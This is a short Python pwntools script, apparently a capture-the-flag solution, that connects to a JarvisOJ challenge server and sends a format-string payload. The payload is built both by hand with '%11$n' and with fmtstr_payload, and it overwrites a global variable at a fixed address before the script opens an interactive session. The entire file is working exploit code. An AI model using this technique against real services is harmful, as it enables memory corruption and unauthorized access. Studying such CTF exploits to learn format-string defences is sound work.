#!/usr/bin/python
from pwn import *
sh = remote('pwn2.jarvisoj.com',9895)
x_addr = 0x804a02c
payload = p32(x_addr) + '%11$n'
payload2 = fmtstr_payload(11, {x_addr: 4})
success('payload from pwntools: '+payload2)
success('payload made by myself: '+payload)
sh.send(payload2)
sh.interactive()
